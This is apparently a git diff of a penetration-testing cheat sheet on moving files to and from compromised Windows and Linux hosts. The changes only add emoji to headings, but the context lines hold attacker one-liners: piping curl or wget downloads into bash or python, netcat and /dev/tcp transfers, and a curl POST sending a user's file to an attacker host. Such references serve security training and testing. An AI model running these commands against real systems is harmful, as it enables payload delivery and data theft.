@@ -13,7 +13,7 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
 <summary><h2>📥 Downloads</h2></summary>
 
 <details>
-<summary><h3>PowerShell Downloads</h3></summary>
+<summary><h3>⚡ PowerShell Downloads</h3></summary>
 
 <details>
 <summary><h4>PowerShell DownloadFile Method</h4></summary>
@@ -113,7 +113,7 @@ Using Credentials:
 </details>
 
 <details>
-<summary><h4>PowerShell DownloadString - Fileless Method</h4></summary>
+<summary><h4>👻 PowerShell DownloadString - Fileless Method</h4></summary>
 
 Default:
 
@@ -279,7 +279,7 @@ Skip SSL validation (PowerShell 5.1 or previous):
 </details>
 
 <details>
-<summary><h3>SMB Downloads</h3></summary>
+<summary><h3>🤝 SMB Downloads</h3></summary>
 
 <details>
 <summary><h4>Default</h4></summary>
@@ -359,7 +359,7 @@ net use n: \\<IP>\share /persistent:no
 </details>
 
 <details>
-<summary><h4>Using credentials</h4></summary>
+<summary><h4>🔑 Using credentials</h4></summary>
 
 1. **Create** the SMB Server on AttackHost
 
@@ -454,7 +454,7 @@ net use n: /delete /y
 </details>
 
 <details>
-<summary><h3>FTP Downloads</h3></summary>
+<summary><h3>📂 FTP Downloads</h3></summary>
 
 1. **Start** Python3 FTP Server on AttackHost
 
@@ -540,10 +540,10 @@ ftp -i -v -n -s:ftpcommand.txt
 <summary><h2>📤 Uploads</h2></summary>
 
 <details>
-<summary><h3>PowerShell Uploads</h3></summary>
+<summary><h3>⚡ PowerShell Uploads</h3></summary>
 
 <details>
-<summary><h4>PowerShell Base64 Encode & Decode</h4></summary>
+<summary><h4>🔡 PowerShell Base64 Encode & Decode</h4></summary>
 
 1. **Encode** file on Target (Windows)
 
@@ -653,7 +653,7 @@ curl.exe -X POST http://<IP>:<PORT>/upload -F "files=@C:\Users\Cartman\Desktop\F
 </details>
 
 <details>
-<summary><h4>PowerShell Base64 Web Upload</h4></summary>
+<summary><h4>🔡 PowerShell Base64 Web Upload</h4></summary>
 
 Script needed: [`linux_file_receiver.py`](../scripts/file_transfers/linux_file_receiver.py)
 
@@ -756,7 +756,7 @@ file ThisisATextFile.txt
 </details>
 
 <details>
-<summary><h3>SMB Uploads</h3></summary>
+<summary><h3>🤝 SMB Uploads</h3></summary>
 
 1. **Start** WebDav server on AttackHost (Linux)
 
@@ -813,7 +813,7 @@ copy <FILE PATH> \\<IP>\sharefolder\
 </details>
 
 <details>
-<summary><h3>FTP Uploads</h3></summary>
+<summary><h3>📂 FTP Uploads</h3></summary>
 
 1. **Start** FTP Server on AttackHost (Linux)
 
@@ -903,7 +903,7 @@ ftp -v -n -s:ftpcommand.txt
 <summary><h2>📥 Downloads</h2></summary>
 
 <details>
-<summary><h3>Base64 Encoding / Decoding</h3></summary>
+<summary><h3>🔡 Base64 Encoding / Decoding</h3></summary>
 
 1. **Check** MD5 hash and **encode** file on AttackHost
 
@@ -954,7 +954,7 @@ md5sum <FILE>
 </details>
 
 <details>
-<summary><h3>Wget Downloads</h3></summary>
+<summary><h3>🌐 Wget Downloads</h3></summary>
 
 <table width="100%">
 <tr>
@@ -992,7 +992,7 @@ wget -qO- http://<IP>:<PORT>/<FILE> | python3
 </details>
 
 <details>
-<summary><h3>Curl Downloads</h3></summary>
+<summary><h3>🔗 Curl Downloads</h3></summary>
 
 <table width="100%">
 <tr>
@@ -1027,7 +1027,7 @@ curl http://<IP>:<PORT>/<FILE> | bash
 </details>
 
 <details>
-<summary><h3>Download with Bash /dev/tcp</h3></summary>
+<summary><h3>🐧 Download with Bash /dev/tcp</h3></summary>
 
 <table width="100%">
 <tr>
@@ -1059,7 +1059,7 @@ cat <&3
 </details>
 
 <details>
-<summary><h3>SSH/SCP Downloads</h3></summary>
+<summary><h3>🔐 SSH/SCP Downloads</h3></summary>
 
 1. **Start** SSH Server on AttackHost
 
@@ -1115,10 +1115,10 @@ scp user@<ATTACKHOST_IP>:/remote/path/<FILE> /local/path/
 <summary><h2>📤 Uploads</h2></summary>
 
 <details>
-<summary><h3>Web Upload</h3></summary>
+<summary><h3>☁️ Web Upload</h3></summary>
 
 <details>
-<summary><h4>Python UploadServer (Basic)</h4></summary>
+<summary><h4>🐍 Python UploadServer (Basic)</h4></summary>
 
 1. **Start** Web Server on AttackHost
 
@@ -1168,7 +1168,7 @@ curl -F "files=@<FILE>" http://<ATTACKHOST_IP>:<PORT>/upload
 </details>
 
 <details>
-<summary><h4>Authenticated Web Server</h4></summary>
+<summary><h4>🔑 Authenticated Web Server</h4></summary>
 
 1. **Create** server.py on AttackHost
 
@@ -1237,7 +1237,7 @@ sudo python3 server.py
 </details>
 
 <details>
-<summary><h3>SCP Uploads</h3></summary>
+<summary><h3>🔐 SCP Uploads</h3></summary>
 
 <table width="100%">
 <tr>
@@ -1269,7 +1269,7 @@ scp -i <KEY FILE> <FILE> <USER>@<ATTACKHOST_IP>:~
 </details>
 
 <details>
-<summary><h3>FTP Uploads</h3></summary>
+<summary><h3>📂 FTP Uploads</h3></summary>
 
 <table width="100%">
 <tr>
@@ -1302,7 +1302,7 @@ put <FILE>
 </details>
 
 <details>
-<summary><h3>Alternative Web File Transfer</h3></summary>
+<summary><h3>🔄 Alternative Web File Transfer</h3></summary>
 
 A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server.
 
@@ -1353,7 +1353,7 @@ ruby -run -ehttpd . -p8000
 <summary><h2>📥 Downloads</h2></summary>
 
 <details>
-<summary><h3>Python</h3></summary>
+<summary><h3>🐍 Python</h3></summary>
 
 <table width="100%">
 <tr>
@@ -1382,7 +1382,7 @@ python2.7 -c 'import urllib;urllib.urlretrieve ("http://<IP>:<PORT>/<FILE>", "<O
 </details>
 
 <details>
-<summary><h3>PHP</h3></summary>
+<summary><h3>🐘 PHP</h3></summary>
 
 <table width="100%">
 <tr>
@@ -1414,7 +1414,7 @@ php -r '$lines = @file("http://<IP>:<PORT>/<FILE>"); foreach ($lines as $line_nu
 </details>
 
 <details>
-<summary><h3>Ruby</h3></summary>
+<summary><h3>💎 Ruby</h3></summary>
 
 <table width="100%">
 <tr>
@@ -1439,7 +1439,7 @@ ruby -e 'require "net/http"; File.write("<OUTPUT FILE>", Net::HTTP.get(URI.parse
 </details>
 
 <details>
-<summary><h3>Perl</h3></summary>
+<summary><h3>🐪 Perl</h3></summary>
 
 <table width="100%">
 <tr>
@@ -1464,7 +1464,7 @@ perl -e 'use LWP::Simple; getstore("http://<IP>:<PORT>/<FILE>", "<OUTPUT FILE>")
 </details>
 
 <details>
-<summary><h3>JavaScript (Windows)</h3></summary>
+<summary><h3>📜 JavaScript (Windows)</h3></summary>
 
 1. **Create** the script wget.js
 
@@ -1515,7 +1515,7 @@ cscript.exe /nologo wget.js http://<IP>:<PORT>/<FILE> <OUTPUT FILE>
 </details>
 
 <details>
-<summary><h3>VBScript (Windows)</h3></summary>
+<summary><h3>🪟 VBScript (Windows)</h3></summary>
 
 1. **Create** the script wget.vbs
 
@@ -1574,7 +1574,7 @@ cscript.exe /nologo wget.vbs http://<IP>:<PORT>/<FILE> <OUTPUT FILE>
 <summary><h2>📤 Uploads</h2></summary>
 
 <details>
-<summary><h3>Python</h3></summary>
+<summary><h3>🐍 Python</h3></summary>
 
 <table width="100%">
 <tr>
@@ -1611,7 +1611,7 @@ python3 -c 'import requests;requests.post("http://<ATTACKHOST_IP>:<PORT>/uploads
 <summary><h2>📡 NC</h2></summary>
 
 <details>
-<summary><h3>Netcat</h3></summary>
+<summary><h3>🔌 Netcat</h3></summary>
 
 **Standard Transfer (AttackHost → Target)**
 
@@ -1710,7 +1710,7 @@ nc <ATTACKHOST_IP> 443 > <OUTPUT FILE>
 </details>
 
 <details>
-<summary><h3>Ncat</h3></summary>
+<summary><h3>🔌 Ncat</h3></summary>
 
 **Standard Transfer (AttackHost → Target)**
 
@@ -1807,7 +1807,7 @@ ncat <ATTACKHOST_IP> 443 --recv-only > <OUTPUT FILE>
 </details>
 
 <details>
-<summary><h3>Bash /dev/tcp</h3></summary>
+<summary><h3>🐧 Bash /dev/tcp</h3></summary>
 
 If Netcat or Ncat are not available, Bash can use the pseudo-device `/dev/tcp/host/port` for file transfers.
 
@@ -1841,7 +1841,7 @@ cat < /dev/tcp/<ATTACKHOST_IP>/443 > <OUTPUT FILE>
 <summary><h2>🖥️ RDP</h2></summary>
 
 <details>
-<summary><h3>File Transfer via RDP Clipboard</h3></summary>
+<summary><h3>📋 File Transfer via RDP Clipboard</h3></summary>
 
 You can transfer files between your local machine and a remote Windows host using the RDP clipboard (copy-paste) feature. This is supported by most RDP clients if clipboard redirection is enabled.
 
@@ -1856,7 +1856,7 @@ You can transfer files between your local machine and a remote Windows host usin
 </details>
 
 <details>
-<summary><h3>File Transfer via RDP Shared Drives</h3></summary>
+<summary><h3>🗂️ File Transfer via RDP Shared Drives</h3></summary>
 
 You can map a local drive to the remote session, making it accessible from the remote host.
 
@@ -1872,7 +1872,7 @@ You can map a local drive to the remote session, making it accessible from the r
 </details>
 
 <details>
-<summary><h3>File Transfer via xfreerdp (Linux)</h3></summary>
+<summary><h3>🐧 File Transfer via xfreerdp (Linux)</h3></summary>
 
 If you are using Linux, you can use `xfreerdp` to enable clipboard and drive redirection.
 
@@ -1943,7 +1943,7 @@ xfreerdp /v:<IP> /u:'<USER>' /p:'<PASSWORD>' +clipboard /drive:share,/tmp/share
 Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [`Invoke-AESEncryption.ps1`](../scripts/file_transfers/Invoke-AESEncryption.ps1) PowerShell script.
 
 <details>
-<summary><h3>Invoke-AESEncryption.ps1</h3></summary>
+<summary><h3>⚡ Invoke-AESEncryption.ps1</h3></summary>
 
 **Installation & Configuration**
 
@@ -2078,7 +2078,7 @@ Import-Module AESCrypt -Force
 </details>
 
 <details>
-<summary><h3>File Encryption Examples</h3></summary>
+<summary><h3>🔐 File Encryption Examples</h3></summary>
 
 <table width="100%">
 <tr>
@@ -2155,7 +2155,7 @@ if (!(Test-Path "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\AESCrypt")
 <summary><h2>🐧 File Encryption on Linux</h2></summary>
 
 <details>
-<summary><h3>openssl</h3></summary>
+<summary><h3>🛡️ openssl</h3></summary>
 
 <table width="100%">
 <tr>
